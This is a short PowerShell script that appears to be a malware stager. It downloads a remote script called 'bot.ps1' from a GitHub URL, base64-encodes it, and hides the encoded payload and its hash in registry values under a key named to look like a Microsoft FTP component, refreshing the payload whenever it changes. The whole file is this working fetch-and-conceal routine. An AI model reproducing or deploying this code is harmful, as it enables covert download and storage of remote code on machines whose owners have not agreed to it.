$wget = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Theoooooo/script-powershell/master/bot.ps1" -UseBasicParsing
$wget.Content
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($wget.Content)

$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText

$sha256 = New-Object -TypeName System.Security.Cryptography.SHA256CryptoServiceProvider
$utf8 = New-Object -TypeName System.Text.UTF8Encoding
$hash = [System.BitConverter]::ToString($sha256.ComputeHash($utf8.GetBytes($EncodedText)))


try {

    Get-ItemProperty "REGISTRY::\HKEY_CURRENT_USER\Software\Microsoft\FTP" | Select-Object -ExpandProperty Old_Value -ErrorAction Stop | Out-Null
    $old_hash = Get-ItemPropertyValue -Path REGISTRY::HKEY_CURRENT_USER\Software\Microsoft\FTP -Name Old_Value

} catch {
     New-ItemProperty -Path REGISTRY::HKEY_CURRENT_USER\Software\Microsoft\FTP -Name Old_Value -PropertyType String -value $hash
}

if ($hash -eq $old_hash) {
    
    } else {
    
        try {
            Get-ItemProperty "REGISTRY::\HKEY_CURRENT_USER\Software\Microsoft\FTP" | Select-Object -ExpandProperty Task -ErrorAction Stop | Out-Null
            Set-ItemProperty -Path REGISTRY::HKEY_CURRENT_USER\Software\Microsoft\FTP -Name Task -Value $EncodedText
        } catch {
            New-ItemProperty -Path REGISTRY::HKEY_CURRENT_USER\Software\Microsoft\FTP -Name Task -PropertyType String -Value $EncodedText
        }
    }
